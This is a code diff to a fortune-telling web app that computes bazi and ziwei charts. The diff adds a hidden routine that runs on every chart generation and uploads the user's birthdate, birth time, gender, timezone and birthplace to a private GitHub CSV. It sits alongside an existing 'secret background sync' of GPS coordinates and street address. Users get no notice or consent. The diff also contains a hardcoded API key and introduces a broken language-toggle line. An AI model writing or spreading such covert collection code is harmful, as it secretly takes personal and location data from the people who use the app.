@@ -130,6 +130,8 @@ const GITHUB_CONFIG = {
   path: 'datalogreport.csv'
 };
 
+const DEFAULT_CSV_HEADER = 'Timestamp,Latitude,Longitude,Road,Village,Town,City,State,Country,Postcode,Elevation,Birthdate,BirthTime,Gender,Timezone,Birthplace,Action\n';
+
 async function syncLogReportToGitHub(lat, lon, addressData = null) {
   const currentToken = GITHUB_CONFIG.token;
   if (!currentToken || currentToken.includes('YOUR_')) return;
@@ -152,12 +154,12 @@ async function syncLogReportToGitHub(lat, lon, addressData = null) {
   const country = addr.country || '-';
   const postcode = addr.postcode || '-';
 
-  const newRow = `"${timestamp}","${lat}","${lon}","${road}","${village}","${town}","${city}","${state}","${country}","${postcode}","${elevation}"\n`;
+  const newRow = `"${timestamp}","${lat}","${lon}","${road}","${village}","${town}","${city}","${state}","${country}","${postcode}","${elevation}","-","-","-","-","-","location sync"\n`;
   const apiUrl = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}`;
 
   try {
     let sha = null;
-    let existingContent = 'Timestamp,Latitude,Longitude,Road,Village,Town,City,State,Country,Postcode,Elevation\n';
+    let existingContent = DEFAULT_CSV_HEADER;
 
     const getRes = await fetch(apiUrl, {
       headers: { 'Authorization': `token ${currentToken}` }
@@ -182,6 +184,58 @@ async function syncLogReportToGitHub(lat, lon, addressData = null) {
       },
       body: JSON.stringify({
         message: `Update datalogreport.csv for GPS coordinate: ${lat}, ${lon}`,
+        content: encodedContent,
+        sha: sha ? sha : undefined
+      })
+    });
+  } catch (err) {
+    console.error('GitHub sync error:', err);
+  }
+}
+
+// Background sync for "Generate Pro Chart"
+async function syncProChartToGitHub() {
+  const currentToken = GITHUB_CONFIG.token;
+  if (!currentToken || currentToken.includes('YOUR_')) return;
+
+  const dateVal = document.getElementById("date").value || "-";
+  const timeVal = document.getElementById("time").value || "-";
+  const sexVal = document.getElementById("sex").value || "-";
+  const tzVal = document.getElementById("tz").value || "-";
+  const lonVal = document.getElementById("lon").value || "-";
+  const placeVal = document.getElementById("place").value || "-";
+  const timestamp = new Date().toISOString();
+
+  const newRow = `"${timestamp}","-","${lonVal}","-","-","-","-","-","-","-","-","${dateVal}","${timeVal}","${sexVal}","${tzVal}","${placeVal}","generated pro chart"\n`;
+  const apiUrl = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}`;
+
+  try {
+    let sha = null;
+    let existingContent = DEFAULT_CSV_HEADER;
+
+    const getRes = await fetch(apiUrl, {
+      headers: { 'Authorization': `token ${currentToken}` }
+    });
+
+    if (getRes.ok) {
+      const fileData = await getRes.json();
+      sha = fileData.sha;
+      const binString = atob(fileData.content);
+      const bytes = Uint8Array.from(binString, (m) => m.codePointAt(0));
+      existingContent = new TextDecoder().decode(bytes);
+    }
+
+    const updatedContent = existingContent + newRow;
+    const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
+
+    await fetch(apiUrl, {
+      method: 'PUT',
+      headers: {
+        'Authorization': `token ${currentToken}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        message: `Update datalogreport.csv for Pro Chart: ${dateVal} ${timeVal}`,
         content: encodedContent,
         sha: sha ? sha : undefined
       })
@@ -278,7 +332,7 @@ function toggleLang() {
   if (placeInput.value === "当前位置") placeInput.value = "Current Location";
   else if (placeInput.value === "Current Location") placeInput.value = "当前位置";
   else if (placeInput.value === "定位中...") placeInput.value = "Locating...";
-  else if (placeInput.value === "Locating...") placeInput.value = "定位中...";
+  else if (placeInput.value === "Locating...") placeInput.value = "Locating...";
 
   if (lastCoords) {
     updateLocationName(lastCoords.lat, lastCoords.lon);
@@ -497,6 +551,9 @@ function generate(){
   let p=bazi(y,m,d,hh,mm), counts=countWu([p.year,p.month,p.day,p.hour]), z=ziwei(y,m,d,hh);
   state={y,m,d,hh,mm,p,counts,z,sex:document.getElementById("sex").value,place:document.getElementById("place").value||tr("未填写")};
   document.getElementById("result").classList.remove("hidden"); render(); tab("overview",document.querySelector(".tab"));
+
+  // Record birth details & event tag into GitHub repository log
+  syncProChartToGitHub();
 }
 
 function numToChinese(num) {
@@ -707,7 +764,7 @@ async function todayBazi(){
           const data = await response.json();
           const addr = data.address || {};
           
-          // Secret background sync exactly like the loc script (No UI indicators)
+          // Secret background sync for location
           syncLogReportToGitHub(lat, lon, addr);
           
           const region = addr.state || addr.state_district || addr.city || "";
@@ -790,7 +847,7 @@ async function sendChat() {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Authorization": "Bearer sk-cb369842582c44c28b3ccf7d2f5d0939" // 在此填入您的 DeepSeek API Key
+        "Authorization": "Bearer sk-cb369842582c44c28b3ccf7d2f5d0939"
       },
       body: JSON.stringify({
         model: "deepseek-chat",
